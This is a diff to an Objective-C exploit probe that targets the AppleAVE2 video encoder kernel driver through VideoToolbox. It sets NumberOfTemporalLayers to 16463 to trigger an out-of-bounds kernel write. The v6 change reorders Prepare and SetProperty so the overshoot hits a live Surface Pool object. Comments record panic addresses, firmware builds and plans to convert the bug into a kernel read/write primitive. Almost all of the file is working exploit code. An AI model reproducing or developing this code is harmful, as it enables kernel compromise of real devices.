@@ -8,6 +8,9 @@
 //  encode → complete → invalidate). The knob = NumberOfTemporalLayers via
 //  VTSessionSetProperty with the plain-string key (the PoC's property).
 //
+//  v6: Prepare N=8 first (real Surface Pool), then Set the overshoot,
+//  then encode. v5 set-then-Prepare is the this=1 / FAR=0x59 path.
+//
 //  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill);
 //  panic = the count-law receipt, BY DESIGN; one value per tap;
 //  hasKread stays kread32-gated; tokens/logs never leave the device.
@@ -32,10 +35,11 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P142_BUILD   @"p142-avetemporal-v5-honesty"
+#define P142_BUILD   @"p142-avetemporal-v6-prepare-first"
 #define P142_KEY     @"NumberOfTemporalLayers"
 #define P142_DEFAULT 16463         /* the PoC's trigger threshold */
 #define P142_SURVIVE 16462         /* the PoC's surviving value */
+#define P142_PRE     8             /* Prepare-first so this is a real pool */
 
 static void p142_flushCB(void *_Nullable refCon, void *_Nullable e,
                          OSStatus status, VTEncodeInfoFlags info,
@@ -83,14 +87,18 @@ static void p142_bandit(const char *outcome) {
     L(@"  per tap; knob = Documents/p142_layers.txt (decimal).");
     L(@"  blank = 16463 PoC row. 0 = 16462 survival. 16463 = panic row.");
     L(@"  1..16461 cannot hit the OOB (09:06 live: layers=18 readback=1).");
+    L(@"  v6 = Prepare N=8 FIRST (real Surface Pool), THEN Set 16463,");
+    L(@"  THEN encode. v5 set-then-Prepare produced this=1 FAR=0x59.");
     L(@"  T8150 24A435: rc=-12900 is VT RCMode=20 miss, NOT the 27.2 NTL");
     L(@"  kernel pre-check. Nov 1 panics (5x, videocodecd, AppleAVE2");
     L(@"  913.43.1 +0xDA78 far=0x59) fired with that same rc=-12900.");
     L(@"  readback=1 on T8150 = VT store law; the internal count still");
     L(@"  reaches AVE2. Hunt 12 23F77 never panics = different AVE2.");
+    L(@"  Conversion TAP is catalog p149 (pipes + this sequence).");
 
     /* the knob — 0 is the survival control (code used to ignore it). */
     long layers = P142_DEFAULT;
+    long pre = P142_PRE;
     NSString *knob = [NSString stringWithContentsOfFile:
         [docs stringByAppendingPathComponent:@"p142_layers.txt"]
         encoding:NSUTF8StringEncoding error:nil];
@@ -102,6 +110,16 @@ static void p142_bandit(const char *outcome) {
            v, layers, (v == 0) ? @" (0 → 16462 survival)" : @"");
     } else {
         Lf(@"[*] no knob file: layers=%ld (the PoC row)", layers);
+    }
+    NSString *preKnob = [NSString stringWithContentsOfFile:
+        [docs stringByAppendingPathComponent:@"p142_pre.txt"]
+        encoding:NSUTF8StringEncoding error:nil];
+    if (preKnob) {
+        long v = strtol(preKnob.UTF8String, NULL, 10);
+        if (v > 0 && v <= 8) pre = v;
+        Lf(@"[*] pre knob: parsed=%ld pre=%ld", v, pre);
+    } else {
+        Lf(@"[*] no pre knob: Prepare N=%ld then overshoot", pre);
     }
     if (layers > 0 && layers < P142_SURVIVE) {
         Lf(@"[HOLD] layers=%ld < 16462 — this count cannot hit the 16463 OOB.",
@@ -138,24 +156,38 @@ static void p142_bandit(const char *outcome) {
     VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                          kCFBooleanFalse);
     CFStringRef key = (__bridge CFStringRef)P142_KEY;
-    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
-                                     kCFNumberSInt32Type, &(int32_t){ (int32_t)layers });
-    st = VTSessionSetProperty(session, key, val);
-    CFRelease(val);
-    Lf(@"[2] usage st=%d rc st=%d SetProperty(NumberOfTemporalLayers=%ld)"
-       @" st=%d", (int)sUsage, (int)sRC, layers, (int)st);
+    /* v6: Prepare with an in-bounds count so the Surface Pool ctor
+       gets a real `this`, then Set the overshoot onto the live context.
+       v5 set-then-Prepare is the this=1 / FAR=0x59 path. */
+    int32_t pre32 = (int32_t)pre;
+    CFNumberRef preVal = CFNumberCreate(kCFAllocatorDefault,
+                                        kCFNumberSInt32Type, &pre32);
+    st = VTSessionSetProperty(session, key, preVal);
+    CFRelease(preVal);
+    Lf(@"[2] usage st=%d rc st=%d SetProperty(NTL pre=%ld) st=%d",
+       (int)sUsage, (int)sRC, pre, (int)st);
     if (sRC == -12900) {
         L(@"[law] rc st=-12900 = VT RCMode=20 property miss on this build.");
         L(@"  27.2 kernel pre-check returns -12900 on NumberOfTemporalLayers");
         L(@"  itself (ntl st). ntl st=0 here = 27.0 still accepts the count.");
         L(@"  Nov 1 T8150 panics used this same rc=-12900 + N=16463.");
     }
+
+    st = VTCompressionSessionPrepareToEncodeFrames(session);
+    Lf(@"[3] Prepare st=%d (real Surface Pool; this must not be 1)", (int)st);
+
+    int32_t lay32 = (int32_t)layers;
+    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
+                                     kCFNumberSInt32Type, &lay32);
+    st = VTSessionSetProperty(session, key, val);
+    CFRelease(val);
+    Lf(@"[3b] IN FLIGHT SetProperty(NTL overshoot=%ld) st=%d", layers, (int)st);
     if ((int)st == -12900) {
         L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check (this SKU");
         L(@"  should not show that on 24A435).");
     }
 
-    /* the readback: the stage9 row */
+    /* the readback: the stage9 row after the overshoot set */
     {
         void *rb = NULL;
         OSStatus rst = VTSessionCopyProperty(session, key,
@@ -163,7 +195,7 @@ static void p142_bandit(const char *outcome) {
         if (rst == 0 && rb) {
             int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                              kCFNumberSInt32Type, &rv);
-            Lf(@"[2c] readback = %d (16463 = VT stored the raw count;"
+            Lf(@"[3c] readback = %d (16463 = VT stored the raw count;"
                @" 1 = VT store clamp; 0 = dropped)", rv);
             if (rv == 1 && layers > 1) {
                 L(@"[law] readback=1 is VT's store. T8150 24A435 still delivers");
@@ -173,12 +205,9 @@ static void p142_bandit(const char *outcome) {
             }
             CFRelease(rb);
         } else {
-            Lf(@"[2c] readback st=%d", (int)rst);
+            Lf(@"[3c] readback st=%d", (int)rst);
         }
     }
-
-    st = VTCompressionSessionPrepareToEncodeFrames(session);
-    Lf(@"[3] Prepare st=%d", (int)st);
 
     CVPixelBufferRef pb = NULL;
     st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
